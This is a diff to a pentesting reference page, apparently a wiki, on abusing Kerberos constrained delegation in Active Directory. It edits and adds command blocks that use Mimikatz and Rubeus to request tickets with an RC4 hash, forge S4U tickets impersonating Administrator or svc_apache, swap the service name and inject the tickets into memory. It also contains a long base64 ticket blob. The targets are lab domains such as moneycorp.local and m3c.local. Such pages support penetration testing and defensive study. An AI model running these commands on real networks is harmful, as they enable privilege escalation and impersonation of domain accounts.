@@ -31,7 +31,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 ```
 {% endcode %}
 
-{% code title="Using Rubeus" %}
+{% code title="Using Rubeus " %}
 ```bash
 #Obtain a TGT for the Constained allowed user
 .\Rubeus.exe asktgt /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
@@ -42,7 +42,38 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 #Impersonate Administrator on different service (HOST)
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST
 #Load ticket in memory
-.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
+.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp
+```
+{% endcode %}
+
+{% code title="Other Method (Rubeus)" %}
+```
+Rubeus.exe tgtdeleg 
+.\Rubeus.exe s4u
+/ticket:doIE9jCCBPKgAwIBBaEDAgEWooIEBTCCBAFhggP9MIID+aADAgEFoQsbCU0zQy5MT0NBT
+KIeMBygAwIBAqEVMBMbBmtyYnRndBsJTTNDLkxPQ0FMo4IDwzCCA7+gAwIBEqEDAgECooIDsQSCA6
+3MkP00gTXk3eKQPGJKfoYjY3I3Bg0T6zCZVoQOLPIWI0qR7oMkgRcV1bQ6iyTdAfbbWeuR/IK7osn
+RC4EckM+t7QvA4Qnr0t6EJtFNEexa2NG5F9sOv5tlDVSRmFec2+zvw5CDv+sO9dgnOFCPv9rxW40F
+Dyz41ccdLuHiRIUT5IgBfT8FR+KF87vc+fFwVDlbqETlzmXUH0or334+YUMdjJDahw/UZAgZh9/U/
+hGpqsHdhujNsgJR+MCARBAuC+1PLtzDrRLFR8/Ay4svRr1KAQN7KVopt2FeMUAtWy2QTHWyMFvl7b
+5sR4jk0INj5p97Iy1/c9K8V/H0B56PCcUxib+z2SxYZ0koNgsTRI4VwmLxXG7lNu512/fUrLxpcbP
+fnAuGAqZuUAKcZquReDRNp3FaKNSphWoY3nTO2ays4hUq3Skhhn3TybM1yg7l4yzdeS+fbBOJ76O2
+RpvaMJk3OjTgbMftyKl3nx8yI4Knlxxj0XixHaS3L2lLGfWeCiRaSnJhRq1A10QA/7IMU+V4MkVLf
+3sxz4A1TCESHuO2lWvMud3QACJiQlp+uZc8mzKDSHzq8ZUXfHwUw5GjnsMz+n05o+a5/HiGtTzysX
+21IukfnHrGDQd2EHd8XVSfhI5ntxhAny3P8WKcBDy5J3gDLqjGZAQA5TeZril/HKT64uk/S8rmOr5
+BSQJGZxXpzMyTs38D1Szi2oGADeSF7mZoN3BS8ebkBgxqxJaOxAnFeGlRjao6je79encUOS/iWmfv
+ooGP296u8xB4y6Hki+1MLH7QFN2gVddZ5UTZKsE45qZzixEfOa8qKbejb/dCAgAquNCKpbL/2VGCJ
+whPrDVVRDZFNy6DBZ29wZI3GjhcSU/K2JnN8vIe0EpHOaPgHVIF19tGzyioeTZdedjRCC7P6LCEUc
+rojWbXJt8bxP3BbJN6Bdp9nwTogKf3OONJhapRn0PfZZQYQdZ0tEd3RNAmqCyWEf5tbUd+wyjwjVE
+2cdObubHOJQtcXiMxZF7G9YReg/XzGybX4hkindZyS/9jkff4BiIaMk/e7L66ASIT4EeaIiSwS9tn
+fCiJxBb59Arn7WYIH+srTRSCYbssbSiCghUW15km5fo4KnVNO6UIWDxdk0JZ+z5JnkL6TGo0++bLX
+dOAyPXDWoPmCbLA3jyFebHN98jzzPZgotC7vFpTv8h5jJ5zNeIxcN7PHr+qMRbBISMxxB6mkHFB1g
+8yubytnDET6Wx4LUm3OIzqRaOB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgE
+SoSIEID46bIOxprG+RsD6AyYyOB2Izk7AINDtf+FOAXDBbdlioQsbCU0zQy5MT0NBTKIUMBKgAwIB
+AaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyMDA0MjIwOTEwNDFaphEYDzIwMjAwNDIyMTkwM
+DAxWqcRGA8yMDIwMDQyOTA5MDAwMVqoCxsJTTNDLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0Gw
+lNM0MuTE9DQUw= /impersonateuser:svc_apache /domain:m3c.local
+/msdsspn:time/M3WEBAW.M3C.LOCAL /dc:M3DC.M3C.LOCAL /ptt
 ```
 {% endcode %}
 
